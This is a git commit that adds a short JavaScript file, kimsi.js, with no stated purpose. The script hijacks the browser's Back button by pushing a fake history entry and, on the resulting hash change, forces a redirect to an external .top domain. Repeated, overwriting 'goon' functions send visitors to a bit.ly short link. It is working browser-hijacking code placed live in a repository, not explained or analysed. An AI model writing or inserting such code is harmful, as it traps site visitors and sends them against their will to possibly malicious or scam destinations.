8020130898cc6b4d0dab39129ebadbb66bb0e388
katemj25 <mbokofficial1@gmail.com>
2025-04-17 17:20:45 -0700

    Create kimsi.js

---
+++ kimsi.js
@@ -0,0 +1,17 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://echifobi.top/4/9089389";
+    }
+    function goon(){
+        location.href="https://echifobi.top/4/9089389";
+    }
+function goon(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
+function goon(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
